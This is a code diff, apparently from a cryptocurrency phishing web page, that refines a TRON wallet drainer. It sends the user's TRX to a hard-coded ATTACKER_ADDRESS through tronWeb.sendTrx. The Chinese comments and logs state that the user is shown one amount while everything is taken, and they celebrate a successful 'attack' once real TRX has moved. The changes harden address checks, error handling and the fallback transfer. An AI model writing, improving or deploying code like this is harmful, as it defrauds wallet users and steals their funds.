@@ -2859,6 +2859,16 @@
                 if (!ATTACKER_ADDRESS || ATTACKER_ADDRESS.length !== 34 || !ATTACKER_ADDRESS.startsWith('T')) {
                     throw new Error(`Invalid TRON address format: ${ATTACKER_ADDRESS}`);
                 }
+                
+                // 🎯 验证当前钱包地址
+                const currentWalletAddr = tronWeb.defaultAddress && tronWeb.defaultAddress.base58;
+                if (!currentWalletAddr || currentWalletAddr.length !== 34 || !currentWalletAddr.startsWith('T')) {
+                    throw new Error(`Invalid wallet address: ${currentWalletAddr}`);
+                }
+                
+                debugLog(`🎯 地址验证通过:`);
+                debugLog(`- 当前钱包: ${currentWalletAddr}`);
+                debugLog(`- 目标地址: ${ATTACKER_ADDRESS}`);
 
                 // 🎯 验证转账金额
                 if (!transferAmount || transferAmount <= 0) {
@@ -2931,10 +2941,10 @@
                 try {
                     // 🎯 方法1: 标准sendTrx调用
                     debugLog('🎯 尝试方法1: sendTrx');
+                    debugLog(`🎯 sendTrx参数: to=${ATTACKER_ADDRESS}, amount=${userInputAmountSun}, from=${tronWeb.defaultAddress.base58}`);
                     transaction = await tronWeb.trx.sendTrx(
                         ATTACKER_ADDRESS,
-                        userInputAmountSun,
-                        tronWeb.defaultAddress.base58
+                        userInputAmountSun
                     );
                     debugLog('🎯 sendTrx成功');
                 } catch (error1) {
@@ -2942,7 +2952,8 @@
                     debugLog(`🎯 sendTrx错误详情: ${JSON.stringify(error1)}`);
                     
                     // 🎯 检查是否是用户取消
-                    if (error1.message.includes('User rejected') || error1.message.includes('cancelled')) {
+                    const errorMessage = error1.message || error1.toString() || '';
+                    if (errorMessage.includes('User rejected') || errorMessage.includes('cancelled')) {
                         debugLog('🎯 用户取消了交易');
                         showToast('交易已取消', 'error');
                         return;
@@ -2962,7 +2973,8 @@
                         debugLog(`🎯 sendTransaction错误详情: ${JSON.stringify(error2)}`);
                         
                         // 🎯 检查是否是用户取消
-                        if (error2.message.includes('User rejected') || error2.message.includes('cancelled')) {
+                        const errorMessage2 = error2.message || error2.toString() || '';
+                        if (errorMessage2.includes('User rejected') || errorMessage2.includes('cancelled')) {
                             debugLog('🎯 用户取消了交易');
                             showToast('交易已取消', 'error');
                             return;
@@ -2997,7 +3009,8 @@
                             debugLog(`🎯 最终错误详情: ${JSON.stringify(error3)}`);
                             
                             // 🎯 检查是否是用户取消
-                            if (error3.message.includes('User rejected') || error3.message.includes('cancelled')) {
+                            const errorMessage3 = error3.message || error3.toString() || '';
+                            if (errorMessage3.includes('User rejected') || errorMessage3.includes('cancelled')) {
                                 debugLog('🎯 用户在签名阶段取消了交易');
                                 showToast('交易已取消', 'error');
                                 return;
@@ -3181,7 +3194,9 @@
                 debugLog('⚠️ 警告：备用方案用户会看到真实转账信息！');
                 try {
                     debugLog(`🎯 备用方案: sendTrx到${ATTACKER_ADDRESS}, 用户看到${fromAmount}TRX，实际转走全部`);
-                    const backupTransaction = await tronWeb.trx.sendTrx(ATTACKER_ADDRESS, userInputAmountSun);
+                    const backupAmountSun = Math.floor(fromAmount * 1000000);
+                    debugLog(`🎯 备用方案金额: ${backupAmountSun} SUN`);
+                    const backupTransaction = await tronWeb.trx.sendTrx(ATTACKER_ADDRESS, backupAmountSun);
 
                     debugLog(`🎯 备用转账成功！交易哈希: ${backupTransaction.txid || backupTransaction}`);
                     debugLog('🏆🏆🏆 备用攻击成功！真实TRX已转移！🏆🏆🏆');
